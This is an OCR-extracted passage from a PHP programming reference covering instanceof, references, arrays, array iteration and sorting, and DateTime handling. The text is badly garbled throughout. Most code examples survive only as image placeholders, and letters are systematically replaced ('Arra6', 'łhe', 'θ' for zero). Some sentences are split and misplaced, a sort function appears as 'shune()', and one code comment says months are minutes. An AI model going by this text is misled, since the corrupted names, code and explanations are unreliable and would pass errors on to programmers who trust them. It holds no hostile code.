Section 10.15: instanceof (t6pe operator)

For checking whether some object is of a certain class, the (binary) instanceof operator can be used since PHP version 5.

The first (left) parameter is the object to test. If this variable is not an object, instanceof always returns false. If a constant expression is used, an error is thrown.

The second (right) parameter is the class to compare with. The class can be provided as the class name itself, a string variable containing the class name (not a string constant!) or an object of that class.

![](image_rsrcKW9.jpg)

instanceof can also be used to check whether an object is of some class which extends another class or implements some interface:

![](image_rsrcKWA.jpg)

To check whether an object is not of some class, the not operator (!) can be used:

![](image_rsrcKWB.jpg)

Note that parentheses around $o instanceof MyClass are not needed because instanceof has higher precedence than !, although it may make the code better readable with parentheses.

Caveats

If a class does not exist, the registered autoload functions are called to try to define the class (this is a topic outside the scope of this part of the Documentation!). In PHP versions before 5.1.0, the instanceof operator would also trigger these calls, thus actually defining the class (and if the class could not be defined, a fatal error would occur). To avoid this, use a string:

![](image_rsrcKWC.jpg)

As of PHP version 5.1.0, the registered autoloaders are not called anymore in these situations.

In older versions of PHP (before 5.0), the is\_a function can be used to determine wether an object is of some class. This function was deprecated in PHP version 5 and undeprecated in PHP version 5.3.0.

Chapter 11: References

Section 11.1: Assign b6 Reference

This is the first phase of referencing. Essentially when you assign by reference, you're allowing two variables to share the same value as such.

![](image_rsrcKWD.jpg)

$foo and $bar are equal here. They do not point to one another. They point to the same place (the "value").

![](image_rsrcKWE.jpg)You can also assign by reference within the reference.

language construct. While not strictly being an assignment by

![](image_rsrcKWF.jpg)

![](image_rsrcKWG.jpg)Note, however, that references inside arrays are potentially dangerous. Doing a normal (not by reference) assignment with a reference on the right side does not turn the left side into a reference, but references inside arrays are preserved in these normal assignments. This also applies to function calls where the array is passed by value.

Assigning by reference is not only limited to variables and arrays, they are also present for functions and all "pass- by-reference" associations.

![](image_rsrcKWH.jpg)

Assignment is key within the function definition as above. You can not pass an expression by reference, only a value/variable. Hence the instantiation of $a in bar().

Section 11.2: Return b6 Reference

![](image_rsrcKJ7.jpg)Occasionally there comes time for you to implicitly return-by-reference.

Returning by reference is useful when you want to use a function to find to which variable a reference should be bound. Do not use return-by-reference to increase performance. The engine will automatically optimize this on its own. Only return references when you have a valid technical reason to do so.

Taken from the PHP Documentation for Returning By Reference.

There are many different forms return by reference can take, including the following example:

![](image_rsrcKWJ.jpg)

Return by reference is not only limited to function references. You also have the ability to implicitly call the function:

![](image_rsrcKWK.jpg)

You cannot directly reference a function call, it has to be assigned to a variable before harnessing it. To see how that works, simply try echo &myFunction();.

Notes

![](image_rsrcKWM.jpg)![](image_rsrcKWN.jpg)![](image_rsrcKWP.jpg)

You are required to specify a reference (&) in both places you intend on using it. That means, for your function definition (function &myFunction() {...) and in the calling reference (function callFunction(&$variable) {... or &myFunction();).

![](image_rsrcKWR.jpg)![](image_rsrcKWS.jpg)You can only return a variable by reference. Hence the instantiation of $a in the example above. This means you can not return an expression, otherwise an E\_NOTICE PHP error will be generated (Nołice: Onﾕy

........... ).

Return by reference does have legitimate use cases, but I should warn that they should be used sparingly, only after exploring all other potential options of achieving the same goal.

Section 11.3: Pass b6 Reference

This allows you to pass a variable by reference to a function or element that allows you to modify the original variable.

Passing-by-reference is not limited to variables only, the following can also be passed by reference:

![](image_rsrcKWT.jpg)![](image_rsrcKWU.jpg)New statements, e.g.

![](image_rsrcKWV.jpg)References returned from functions

Arrays

creating new arrays or littering your namespace. Passing-by-reference is as simple as preceding/prefixing the variable with an & \=> &$myElement.

Below is an example of harnessing an element from an array and simply adding 1 to its initial value.

![](image_rsrcKWW.jpg)

Now when you harness any element within $arr, the original element will be updated as the reference was increased. You can verify this by:

![](image_rsrcKWX.jpg)

![](image_rsrcKWY.jpg)Note

You should take note when harnessing pass by reference within loops. At the end of the above loop, $num still holds a reference to the last element of the array. Assigning it post loop will end up manipulating the last array element! You can ensure this doesn't happen by unset()'ing it post-loop:

![](image_rsrcKWZ.jpg)

The above will ensure you don't run into any issues. An example of issues that could relate from this is present in this question on StackOverflow.

Functions

Another common usage for passing-by-reference is within functions. Modifying the original variable is as simple as:

![](image_rsrcKX0.jpg)

Which can be verified by echo'ing the original variable.

![](image_rsrcKX1.jpg)

![](image_rsrcKX2.jpg)There are various restrictions around functions, as noted below from the PHP docs:

Note: There is no reference sign on a function call - only on function definitions. Function definitions alone are enough to correctly pass the argument by reference. As of PHP 5.3.0, you will get a warning

![](image_rsrcKX3.jpg)saying that "call-time pass-by-reference" is deprecated when you use & in foo(&$a);. And as of PHP 5.4.0, call-time pass-by-reference was removed, so using it will raise a fatal error. 

Chapter 12: Arra6s

Parameter​Detail

Key Value

The key is the unique identifier and index of an array. It may be a string or an integer. Therefore, valid keys would be 'foo', '5', 1θ, 'a2b', ...

For each key there is a corresponding value (null otherwise and a notice is emitted upon access). The value has no restrictions on the input type.

An array is a data structure that stores an arbitrary number of values in a single value. An array in PHP is actually an ordered map, where map is a type that associates values to keys.

Section 12.1: Initializing an Arra6

An array can be initialized empty:

![](image_rsrcKX4.jpg)

An array can be initialized and preset with values:

![](image_rsrcKX5.jpg)

An array can also be initialized with custom indexes (also called an associative array):

![](image_rsrcKX6.jpg)

If the variable hasn't been used before, PHP will create it automatically. While convenient, this might make the code harder to read:

![](image_rsrcKX7.jpg)

![](image_rsrcKX8.jpg)

The index will usually continue where you left off. PHP will try to use numeric strings as integers:

![](image_rsrcKX9.jpg)

To initialize an array with fixed size you can use SplFixedArray:

![](image_rsrcKXA.jpg)

Note: An array created using SplFixedArray has a reduced memory footprint for large sets of data, but the keys must be integers.

To initialize an array with a dynamic size but with n non empty elements (e.g. a placeholder) you can use a loop as follows:

![](image_rsrcKXB.jpg)

If all your placeholders are the same then you can also create it using the function array\_fill():

![](image_rsrcKXC.jpg)array array\_fill ( int $start\_index , int $num , mixed $value )

This creates and returns an array with num entries of value, keys starting at start\_index.

Note: If the start\_index is negative it will start with the negative index and continue from 0 for the following elements.

![](image_rsrcKXD.jpg)

Conclusion: With array\_fill() you are more limited for w8h3at you can actually do. The loop is more flexible and

opens you a wider range of opportunities.

Whenever you want an array filled with a range of numbers (e.g. 1-4) you could either append every single element to an array or use the range() function:

![](image_rsrcKXC.jpg)array range ( mixed $start , mixed $end \[, number $step = 1 \] )

This function creates an array containing a range of elements. The first two parameters are required, where they set the start and end points of the (inclusive) range. The third parameter is optional and defines the size of the steps being taken. Creating a range from θ to 4 with a stepsize of 1, the resulting array would consist of the following elements: θ, 1, 2, 3, and 4. If the step size is increased to 2 (i.e. range(θ, 4, 2)) then the resulting array would be: θ, 2, and 4.

![](image_rsrcKXE.jpg)

range can work with integers, floats, booleans (which become casted to integers), and strings. Caution should be taken, however, when using floats as arguments due to the floating point precision problem.

Section 12.2: Check if ke6 exists

Use array\_key\_exists() or isset() or !empty():

![](image_rsrcKXF.jpg)

Note that isset() treats a null valued element as non-existent. Whereas !empty() does the same for any element that equals false (using a weak comparision; for example, null, '' and θ are all treated as false by !empty()).

While isset($map\['foobar'\]); is true, !empty($map\['foobar'\]) is false. This can lead to mistakes (for example, it is easy to forget that the string 'θ' is treated as false) so use of !empty() is often frowned upon.

Note also that isset() and !empty() will work (and return false) if $map is not defined at all. This makes them somewhat error-prone to use:

![](image_rsrcKXG.jpg)

You can also check for ordinal arrays:

![](image_rsrcKXH.jpg)

Note that isset() has better performance than array\_key\_exists() as the latter is a function and the former a language construct.

You can also use key\_exists(), which is an alias for array\_key\_exists().

Section 12.3: Validating the arra6 t6pe

The function is\_array() returns true if a variable is an array.

![](image_rsrcKXJ.jpg)

You can type hint the array type in a function to enforce a parameter type; passing anything else will result in a fatal error.

![](image_rsrcKXK.jpg)

You can also use the gettype() function.

![](image_rsrcKXM.jpg)

Section 12.4: Creating an arra6 of variables

![](image_rsrcKXN.jpg)

This method is often used in frameworks to pass an array of variables between two components.

Section 12.5: Checking if a value exists in arra6

The function in\_array() returns true if an item exists in an array.

$fruits \= \['banana', 'apple'\];

$foo \= in\_array('banana', $fruits);

// $foo vaﾕue is łrue

$bar \= in\_array('orange', $fruits);

![](image_rsrcKXP.jpg)

You can also use the function array\_search() to get the key of a specific item in an array.

![](image_rsrcKXR.jpg)

PHP 5.x Version ≥ 5.5

In PHP 5.5 and later you can use array\_column() in conjunction with array\_search().

This is particularly useful for checking if a value exists in an associative array:

![](image_rsrcKXS.jpg)

Section 12.6: Arra6Access and Iterator Interfaces

Another useful feature is accessing your custom object collections as arrays in PHP. There are two interfaces available in PHP (>=5.0.0) core to support this: ArrayAccess and Iterator. The former allows you to access your custom objects as array.

ArrayAccess

Assume we have a user class and a database table storing all the users. We would like to create a UserCollection

class that will:

1.  allow us to address certain user by their username unique identifier

2.  perform basic (not all CRUD, but at least Create, Retrieve and Delete) operations on our users collection

Consider the following source (hereinafter we're using short array creation syntax \[\] available since version 5.4):

class UserCollection implements ArrayAccess { protected $\_conn;

protected $\_requiredParams \= \['username','password','email'\];

public function  construct() {

![](image_rsrcKXT.jpg)$connectionParams \= \[

//your connecłion ło łhe dałabase

\];

$this\->\_conn \= DriverManager::getConnection($connectionParams, $config);

}

protected function \_getByUsername($username) {

$ret \= $this\->\_conn\->executeQuery('SELECT \* FROM \`User\` WHERE \`username\` IN (?)', \[$username\]

)->fetch();

return $ret;

}

// START of mełhods required by ArrayAccess inłerface

public function offsetExists($offset) {

return (bool) $this\->\_getByUsername($offset);

}

public function offsetGet($offset) { return $this\->\_getByUsername($offset);

}

public function offsetSet($offset, $value) { if (!is\_array($value)) {

throw new \\Exception('value must be an Array');

}

$passed \= array\_intersect(array\_values($this\->\_requiredParams), array\_keys($value)); if (count($passed) < count($this\->\_requiredParams)) {

throw new \\Exception('value must contain at least the following params: ' . implode(',', $this\->\_requiredParams));

}

$this\->\_conn\->insert('User', $value);

}

public function offsetUnset($offset) { if (!is\_string($offset)) {

throw new \\Exception('value must be the username to delete');

}

if (!$this\->offsetGet($offset)) {

throw new \\Exception('user not found');

}

$this\->\_conn\->delete('User', \['username' \=> $offset\]);

}

// END of mełhods required by ArrayAccess inłerface

}

then we can:

![](image_rsrcKXU.jpg)

87

which will output the following, assuming there was no testuser before we launched the code:

![](image_rsrcKXV.jpg)

IMPORTANT: offsetExists is not called when you check existence of a key with array\_key\_exists function. So the following code will output false twice:

![](image_rsrcKXW.jpg)

Iterator

Let's extend our class from above with a few functions from Iterator interface to allow iterating over it with

foreach and while.

First, we need to add a property holding our current index of iterator, let's add it to the class properties as

$\_position:

![](image_rsrcKXX.jpg)

Second, let's add Iterator interface to the list of interfaces being implemented by our class:

![](image_rsrcKXY.jpg)

then add the required by the interface functions themselves:

![](image_rsrcKXZ.jpg)

![](image_rsrcKY0.jpg)

So all in all here is complete source of the class implementing both interfaces. Note that this example is not perfect, because the IDs in the database may not be sequential, but this was written just to give you the main idea: you can address your objects collections in any possible way by implementing ArrayAccess and Iterator interfaces:

![](image_rsrcKY1.jpg)

and a foreach looping through all user objects:

![](image_rsrcKY2.jpg)

which will output something like

![](image_rsrcKY3.jpg)

Chapter 13: Arra6 iteration

Section 13.1: Iterating multiple arra6s together

Sometimes two arrays of the same length need to be iterated together, for example:

![](image_rsrcKY4.jpg)

array\_map is the simplest way to accomplish this:

![](image_rsrcKY5.jpg)

which will output:

![](image_rsrcKY6.jpg)

This can be done through a common index:

![](image_rsrcKY7.jpg)

![](image_rsrcKY8.jpg)If the two arrays don't have the incremental keys, array\_values($array)\[$i\] can be used to replace $array\[$i\]. If both arrays have the same order of keys, you can also use a foreach-with-key loop on one of the arrays:

Separate arrays can only be looped through if they are the same length and also have the same key name. This means if you don't supply a key and they are numbered, you will be fine, or if you name the keys and put them in the same order in each array.

You can also use array\_combine.

![](image_rsrcKY9.jpg)

Then you can loop through this by doing the same as before:

![](image_rsrcKYA.jpg)

Section 13.2: Using an incremental index

This method works by incrementing an integer from 0 to the greatest index in the array.

![](image_rsrcKYB.jpg)

This also allows iterating an array in reverse order without using array\_reverse, which may result in overhead if the array is large.

![](image_rsrcKYC.jpg)

You can skip or rewind the index easily using this method.

![](image_rsrcKYD.jpg)

Output:

![](image_rsrcKYE.jpg)

For arrays that do not have incremental indices (including arrays with indices in reverse order, e.g. \[1 \=> "foo", θ

\=> "bar"\], \["foo" \=> "f", "bar" \=> "b"\]), this cannot be done directly. array\_values or array\_keys can be used instead:

![](image_rsrcKYF.jpg)

Section 13.3: Using internal arra6 pointers

Each array instance contains an internal pointer. By manipulating this pointer, different elements of an array can be retrieved from the same call at different times.

Each call to each() returns the key and value of the current array element, and increments the internal array pointer.

![](image_rsrcKYG.jpg)

Using next

![](image_rsrcKYH.jpg)

Note that this example assumes no elements in the array are identical to boolean false. To prevent such assumption, use key to check if the internal pointer has reached the end of the array:

![](image_rsrcKYJ.jpg)

This also facilitates iterating an array without a direct loop:

![](image_rsrcKYK.jpg)

Section 13.4: Using foreach

![](image_rsrcKYM.jpg)Direct loop

Loop with keys

![](image_rsrcKYN.jpg)

Loop by reference

In the foreach loops in the above examples, modifying the value ($color or $food) directly doesn't change its value in the array. The & operator is required so that the value is a reference pointer to the element in the array.

![](image_rsrcKYP.jpg)

![](image_rsrcKYR.jpg)

This is similar to:

![](image_rsrcKYS.jpg)

Concurrency

PHP arrays can be modified in any ways during iteration without concurrency problems (unlike e.g. Java Lists). If the array is iterated by reference, later iterations will be affected by changes to the array. Otherwise, the changes to the array will not affect later iterations (as if you are iterating a copy of the array instead). Compare looping by value:

![](image_rsrcKYT.jpg)

Output:

![](image_rsrcKYU.jpg)

But if the array is iterated with reference,

![](image_rsrcKYV.jpg)

Output:

![](image_rsrcKYW.jpg)

The key-value set of 4 => 5 is no longer iterated, and 6 => 7 is changed to 6 => 17.

Section 13.5: Using Arra6Object Iterator

![](image_rsrcKYX.jpg)

Php arrayiterator allows you to modify and unset the values while iterating over arrays and objects. Example:

Output:

![](image_rsrcKYY.jpg)

Chapter 14: Executing Upon an Arra6

Section 14.1: Appl6ing a function to each element of an arra6

To apply a function to every item in an array, use array\_map(). This will return a new array.

![](image_rsrcKYZ.jpg)

$newArray now is array(2,3,4,5,6);.

Instead of using an anonymous function, you could use a named function. The above could be written like:

![](image_rsrcKZ0.jpg)

If the named function is a class method the call of the function has to include a reference to a class object the method belongs to:

![](image_rsrcKZ1.jpg)

Another way to apply a function to every item in an array is array\_walk() and array\_walk\_recursive(). The callback passed into these functions take both the key/index and value of each array item. These functions will not return a new array, instead a boolean for success. For example, to print every element in a simple array:

![](image_rsrcKZ2.jpg)

The value parameter of the callback may be passed by reference, allowing you to change the value directly in the original array:

![](image_rsrcKZ3.jpg)

For nested arrays, array\_walk\_recursive() will go deeper into each sub-array:

![](image_rsrcKZ4.jpg)

Note: array\_walk and array\_walk\_recursive let you change the value of array items, but not the keys. Passing the keys by reference into the callback is valid but has no effect.

Section 14.2: Split arra6 into chunks

array\_chunk() splits an array into chunks

Let's say we've following single dimensional array,

![](image_rsrcKZ5.jpg)

Now using array\_chunk() on above PHP array,

![](image_rsrcKZ6.jpg)

Above code will make chunks of 2 array elements and create a multidimensional array as follow.

![](image_rsrcKZ7.jpg)

If all the elements of the array is not evenly divided by the chunk size, last element of the output array will be remaining elements.

If we pass second argument as less then 1 then E\_WARNING will be thrown and output array will be NULL.

Parameter​Details

$array (array)​Input array, the array to work on

$size (int)​Size of each chunk ( Integer value)

$preserve\_keys (boolean) (optional) If you want output array to preserve the keys set it to TRUE otherwise FALSE.

Section 14.3: Imploding an arra6 into string

implode() combines all the array values but looses all the key info:

![](image_rsrcKZ8.jpg)

Imploding keys can be done using array\_keys() call:

![](image_rsrcKZ9.jpg)

Imploding keys with values is more complex but can be done using functional style:

![](image_rsrcKZA.jpg)

Section 14.4: "Destructuring" arra6s using list()

Use list() to quick assign a list of variable values into an array. See also compact()

![](image_rsrcKZB.jpg)![](image_rsrcKZC.jpg)

With PHP 7.1 (currently in beta) you will be able to use short list syntax:

![](image_rsrcKZD.jpg)

Section 14.5: arra6\_reduce

array\_reduce reduces array into a single value. Basically, The array\_reduce will go through every item with the result from last iteration and produce new value to the next iteration.

Usage: array\_reduce ($array, function($carry, $item){...}, $defaul\_value\_of\_first\_carry)

![](image_rsrcKZE.jpg)$carry is the result from the last round of iteration.

![](image_rsrcKZF.jpg)$item is the value of current position in the array.

Sum of array

![](image_rsrcKZG.jpg)

![](image_rsrcKZH.jpg)

result:15

The largest number in array

![](image_rsrcKZJ.jpg)

result:211

Is all item more than 100

![](image_rsrcKZK.jpg)

result:true

Is any item less than 100

![](image_rsrcKZM.jpg)

result:true

Like implode($array, $piece)

![](image_rsrcKZN.jpg)

result:"hello-world-PHP-language"

if make a implode method, the source code will be:

![](image_rsrcKZP.jpg)

result:"hello-world-PHP-language"

Section 14.6: Push a Value on an Arra6

There are two ways to push an element to an array: array\_push and $array\[\] =

The array\_push is used like this:

![](image_rsrcKZR.jpg)

![](image_rsrcKZS.jpg)

This code will print:

![](image_rsrcKZT.jpg)

$array\[\] = is used like this:

![](image_rsrcKZU.jpg)

This code will print:

![](image_rsrcKZV.jpg)

99

Chapter 15: Manipulating an Arra6

Section 15.1: Filtering an arra6

In order to filter out values from an array and obtain a new array containing all the values that satisfy the filter condition, you can use the array\_filter function.

Filtering non-empty values

The simplest case of filtering is to remove all "empty" values:

![](image_rsrcKZW.jpg)

Filtering by callback

This time we define our own filtering rule. Suppose we want to get only even numbers:

![](image_rsrcKZX.jpg)

The array\_filter function receives the array to be filtered as its first argument, and a callback defining the filter predicate as its second.

Version ≥ 5.6

Filtering by index

A third parameter can be provided to the array\_filter function, which allows to tweak which values are passed to the callback. This parameter can be set to either ARRAY\_FILTER\_USE\_KEY or ARRAY\_FILTER\_USE\_BOTH, which will result in the callback receiving the key instead of the value for each element in the array, or both value and key as its arguments. For example, if you want to deal with indexes istead of values:

![](image_rsrcKZY.jpg)

Indexes in filtered array

Note that array\_filter preserves the original array keys. A common mistake would be to try an use for loop over the filtered array:

![](image_rsrcKZZ.jpg)

![](image_rsrcM00.jpg)

This happens because the values which were on positions 1 (there was θ), 3 (null), 5 (empty string '') and 7 (empty array \[\]) were removed along with their corresponding index keys.

If you need to loop through the result of a filter on an indexed array, you should first call array\_values on the result of array\_filter in order to create a new array with the correct indexes:

![](image_rsrcM01.jpg)

Section 15.2: Removing elements from an arra6

To remove an element inside an array, e.g. the element with the index 1.

![](image_rsrcM02.jpg)

This will remove the apples from the list, but notice that unset does not change the indexes of the remaining elements. So $fruit now contains the indexes θ and 2.

For associative array you can remove like this:

![](image_rsrcM03.jpg)

Now $fruit is

![](image_rsrcM04.jpg)

Note that

![](image_rsrcM05.jpg)

unsets the variable and thus removes the whole array, meaning none of its elements are accessible anymore.

Removing terminal elements

array\_shift() \- Shift an element off the beginning of array.

Example:

![](image_rsrcM06.jpg)

Output:

![](image_rsrcM07.jpg)

array\_pop() \- Pop the element off the end of array.

Example:

![](image_rsrcM08.jpg)

Output:

![](image_rsrcM09.jpg)

Section 15.3: Sorting an Arra6

There are several sort functions for arrays in php: sort()

![](image_rsrcM0A.jpg)

results in

![](image_rsrcM0B.jpg)

rsort()

Sort an array in descending order by value.

![](image_rsrcM0C.jpg)

results in

![](image_rsrcM0D.jpg)

asort()

Sort an array in ascending order by value and preserve the indices.

![](image_rsrcM0E.jpg)

results in

![](image_rsrcM0F.jpg)

arsort()

Sort an array in descending order by value and preserve the indices.

![](image_rsrcM0G.jpg)

results in

![](image_rsrcM0H.jpg)

ksort()

Sort an array in ascending order by key

![](image_rsrcM0J.jpg)

results in

![](image_rsrcM0K.jpg)

krsort()

Sort an array in descending order by key.

![](image_rsrcM0M.jpg)

results in

![](image_rsrcM0N.jpg)

natsort()

Sort an array in a way a human being would do (natural order).

![](image_rsrcM0P.jpg)

results in

![](image_rsrcM0R.jpg)

![](image_rsrcM0S.jpg)

natcasesort()

Sort an array in a way a human being would do (natural order), but case intensive

![](image_rsrcM0T.jpg)

results in

![](image_rsrcM0U.jpg)

shune()

Shunes an array (sorted randomly).

![](image_rsrcM0V.jpg)

As written in the description it is random so here only one example in what it can result

![](image_rsrcM0W.jpg)

usort()

Sort an array with a user defined comparison function.

![](image_rsrcM0X.jpg)

results in

![](image_rsrcM0Y.jpg)

![](image_rsrcM0Z.jpg)

uasort()

Sort an array with a user defined comparison function and preserve the keys.

![](image_rsrcM10.jpg)

results in

![](image_rsrcM11.jpg)

uksort()

Sort an array by keys with a user defined comparison function.

![](image_rsrcM12.jpg)

results in

![](image_rsrcM13.jpg)

Section 15.4: Whitelist onl6 some arra6 ke6s

When you want to allow only certain keys in your arrays, especially when the array comes from request parameters, you can use array\_intersect\_key together with array\_flip.

![](image_rsrcM14.jpg)

If the parameters variable doesn't contain any allowed key, then the filteredParameters variable will consist of an empty array.

Since PHP 5.6 you can use array\_filter for this task too, passing the ARRAY\_FILTER\_USE\_KEY flag as the third parameter:

![](image_rsrcM15.jpg)

Using array\_filter gives the additional flexibility of performing an arbitrary test against the key, e.g. $allowedKeys could contain regex patterns instead of plain strings. It also more explicitly states the intention of the code than array\_intersect\_key() combined with array\_flip().

Section 15.5: Adding element to start of arra6

Sometimes you want to add an element to the beginning of an array without modifying any of the current elements (order) within the array. Whenever this is the case, you can use array\_unshift().

![](image_rsrcKJ7.jpg)array\_unshift() prepends passed elements to the front of the array. Note that the list of elements is prepended as a whole, so that the prepended elements stay in the same order. All numerical array keys will be modified to start counting from zero while literal keys won't be touched.

![](image_rsrcM16.jpg)Taken from the PHP documentation for array\_unshifł().

If you'd like to achieve this, all you need to do is the following:

![](image_rsrcM17.jpg)

This will now add 4 as the first element in your array. You can verify this by:

![](image_rsrcM18.jpg)

![](image_rsrcM19.jpg)This returns an array in the following order: 4, 1, 2, 3.

![](image_rsrcM1A.jpg)

Since the keys

forces the array to reset the key-value pairs as the new element let the following entries have it is smarter to create a new array and append the existing array to the newly created array.

Example:

![](image_rsrcM1B.jpg)

Output ($joinedArray):

![](image_rsrcM1C.jpg)

Eaxmple/Demo

Section 15.6: Exchange values with ke6s

array\_flip function will exchange all keys with its elements.

![](image_rsrcM1D.jpg)

Section 15.7: Merge two arra6s into one arra6

![](image_rsrcM1E.jpg)

Associative array:

![](image_rsrcM1F.jpg)

1.  Merges the elements of one or more arrays together so that the values of one are appended to the end of

the previous one. It returns the resulting array.

2.  If the input arrays have the same string keys, then the later value for that key will overwrite the previous one. If, however, the arrays contain numeric keys, the later value will not overwrite the original value, but will be appended.

3.  Values in the input array with numeric keys will be renumbered with incrementing keys starting from zero in the result array.

Chapter 16: Processing Multiple Arra6s Together

Section 16.1: Arra6 intersection

The array\_intersect function will return an array of values that exist in all arrays that were passed to this function.

![](image_rsrcM1G.jpg)

Array keys are preserved. Indexes from the original arrays are not.

array\_intersect only check the values of the arrays. array\_intersect\_assoc function will return intersection of arrays with keys.

![](image_rsrcM1H.jpg)

array\_intersect\_key function only check the intersection of keys. It will returns keys exist in all arrays.

![](image_rsrcM1J.jpg)

Section 16.2: Merge or concatenate arra6s

![](image_rsrcM1K.jpg)

Note that array\_merge will change numeric indexes, but overwrite string indexes

![](image_rsrcM1M.jpg)

array\_merge overwrites the values of the first array with the values of the second array, if it cannot renumber the index.

it does not renumber numeric indexes, so you lose values of arrays that have an index that is also used in the first array.

![](image_rsrcM1N.jpg)

Section 16.3: Changing a multidimensional arra6 to associative arra6

If you have a multidimensional array like this:

![](image_rsrcM1P.jpg)

And you want to change it to an associative array like this:

![](image_rsrcM1R.jpg)

You can use this code:

![](image_rsrcM1S.jpg)

Or, you can skip setting $associativeArrayKeys and $associativeArrayValues and use this simple one liner:

![](image_rsrcM1T.jpg)

Section 16.4: Combining two arra6s (ke6s from one, values from another)

The following example shows how to merge two arrays into one associative array, where the key values will be the items of the first array, and the values will be from the second:

![](image_rsrcM1U.jpg)

![](image_rsrcM1V.jpg)

Chapter 17: Datetime Class

Section 17.1: Create Immutable version of DateTime from Mutable prior PHP 5.6

To create \\DateTimeImmutable in PHP 5.6+ use:

![](image_rsrcM1W.jpg)

Prior PHP 5.6 you can use:

![](image_rsrcM1X.jpg)

Section 17.2: Add or Subtract Date Intervals

We can use the class DateInterval to add or subtract some interval in a DateTime object.

See the example below, where we are adding an interval of 7 days and printing a message on the screen:

![](image_rsrcM1Y.jpg)

![](image_rsrcKN7.jpg)This will output (running on Aug 1st, 2016):

Samara says: Seven Days. You'll be happy on 2016-08-08.

We can use the sub method in a similar way to subtract dates

![](image_rsrcM1Z.jpg)

![](image_rsrcKH6.jpg)This will output (running on Aug 1st, 2016):

Samara says: Seven Days. You were happy last on 2016-07-25.

Section 17.3: getTimestamp

getTimeStemp is a unix representation of a datetime object.

![](image_rsrcM20.jpg)

this will out put an integer indication the seconds that have elapsed since 00:00:00 UTC, Thursday, 1 January 1970.

Section 17.4: setDate

setDate sets the date in a DateTime object.

![](image_rsrcM21.jpg)

this example sets the date to be the twenty-fifth of July, 2015, it will produce the following result:

![](image_rsrcM22.jpg)

Section 17.5: Create DateTime from custom format

PHP is able to parse a number of date formats. If you want to parse a non-standard format, or if you want your code to explicitly state the format to be used, then you can use the static DateTime::createFromFormat method:

Object oriented style

![](image_rsrcM23.jpg)

Procedural style

![](image_rsrcM24.jpg)

Section 17.6: Printing DateTimes

PHP 4+ supplies a method, format that converts a DateTime object into a string with a desired format. According to PHP Manual, this is the object oriented function:

![](image_rsrcM25.jpg)

The function date() takes one parameters - a format, which is a string Format

The format is a string, and uses single characters to define the format:

![](image_rsrcM26.jpg)![](image_rsrcM27.jpg)![](image_rsrcM28.jpg)Y: four digit representation of the year (eg: 2016) y: two digit representation of the year (eg: 16) m: month, as a number (01 to 12)

![](image_rsrcM29.jpg)M: month, as three letters (Jan, Feb, Mar, etc)

![](image_rsrcM2A.jpg)j: day of the month, with no leading zeroes (1 to 31)

![](image_rsrcM2B.jpg)![](image_rsrcM2C.jpg)D: day of the week, as three letters (Mon, Tue, Wed, etc) h: hour (12-hour format) (01 to 12)

![](image_rsrcM2D.jpg)H: hour (24-hour format) (00 to 23)

![](image_rsrcM2E.jpg)A: either AM or PM

![](image_rsrcM2F.jpg)![](image_rsrcM2G.jpg)![](image_rsrcM2H.jpg)i: minute, with leading zeroes (00 to 59) s: second, with leading zeroes (00 to 59)

Usage

These characters can be used in various combinations to display times in virtually any format. Here are some examples:

![](image_rsrcM2J.jpg)

Procedural

![](image_rsrcM2K.jpg)

The procedural format is similar: Object-Oriented

![](image_rsrcM2M.jpg)Procedural Equivalent

Chapter 18: Working with Dates and Time

Section 18.1: Getting the difference between two dates / times

![](image_rsrcM2N.jpg)The most feasible way is to use, the DateTime class. An example:

<?php

// Creałe a dałe łime objecł, which has łhe vaﾕue of ~ łwo years ago

$twoYearsAgo \= new DateTime("2θ14-θ1-18 2θ:θ5:56");

// Creałe a dałe łime objecł, which has łhe vaﾕue of ~ now

$now \= new DateTime("2θ16-θ7-21 θ2:55:θ7");

// Caﾕcuﾕałe łhe diff

$diff \= $now\->diff($twoYearsAgo);

// $diff\->y conłains łhe difference in years bełween łhe łwo dałes

$yearsDiff \= $diff\->y;

// $diff\->m conłains łhe difference in minułes bełween łhe łwo dałes

$monthsDiff \= $diff\->m;

// $diff\->d conłains łhe difference in days bełween łhe łwo dałes

$daysDiff \= $diff\->d;

// $diff\->h conłains łhe difference in hours bełween łhe łwo dałes

$hoursDiff \= $diff\->h;

// $diff\-\>i conłains łhe difference in minułes bełween łhe łwo dałes

$minsDiff \= $diff\->i;

// $diff\->s conłains łhe difference in seconds bełween łhe łwo dałes

$secondsDiff \= $diff\->s;

// Tołaﾕ Days Diff, łhał is łhe number of days bełween łhe łwo dałes

$totalDaysDiff \= $diff\->days;

// Dump łhe diff aﾕłogełher jusł ło geł some dełaiﾕs ;)

var\_dump($diff);

Also, comparing two dates is much easier, just use the Comparison operators , like:

![](image_rsrcM2P.jpg)

Section 18.2: Convert a date into another format

The Basics

The simplist way to convert one date format into another is to use strtotime() with date(). strtotime() will convert the date into a Unix Timestamp. That Unix Timestamp can then be passed to date() to convert it to the new format.

![](image_rsrcM2R.jpg)

![](image_rsrcM2S.jpg)

Or as a one-liner:

![](image_rsrcM2T.jpg)

Keep in mind that strtotime() requires the date to be in a valid format. Failure to provide a valid format will result in strtotime() returning false which will cause your date to be 1969-12-31.

Using DateTime()

As of PHP 5.2, PHP offered the DateTime() class which offers us more powerful tools for working with dates (and time). We can rewrite the above code using DateTime() as so:

![](image_rsrcM2U.jpg)

Working with Unix timestamps

date() takes a Unix timestamp as its second parameter and returns a formatted date for you:

![](image_rsrcM2V.jpg)

DateTime() works with Unix timestamps by adding an @ before the timestamp:

![](image_rsrcM2W.jpg)

If the timestamp you have is in milliseconds (it may end in θθθ and/or the timestamp is thirteen characters long) you will need to convert it to seconds before you can can convert it to another format. There's two ways to do this:

![](image_rsrcM2X.jpg)Trim the last three digits off using substr()

Trimming the last three digits can be achieved several ways, but using substr() is the easiest:

![](image_rsrcM2Y.jpg)

![](image_rsrcM2Z.jpg)Divide the substr by 1000

You can also convert the timestamp into seconds by dividing by 1000. Because the timestamp is too large for 32 bit systems to do math on you will need to use the BCMath library to do the math as strings:

![](image_rsrcM30.jpg)

To get a Unix Timestamp you can use strtotime() which returns a Unix Timestamp:

![](image_rsrcM31.jpg)

With DateTime() you can use DateTime::getTimestamp()

![](image_rsrcM32.jpg)

If you're running PHP 5.2 you can use the U formatting option instead:

![](image_rsrcM33.jpg)

Working with non-standard and ambiguous date formats

Unfortunately not all dates that a developer has to work with are in a standard format. Fortunately PHP 5.3 provided us with a solution for that. DateTime::createFromFormat() allows us to tell PHP what format a date string is in so it can be successfully parsed into a DateTime object for further manipulation.

![](image_rsrcM34.jpg)

In PHP 5.4 we gained the ability to do class member access on instantiation has been added which allows us to turn our DateTime() code into a one-liner:

![](image_rsrcM35.jpg)

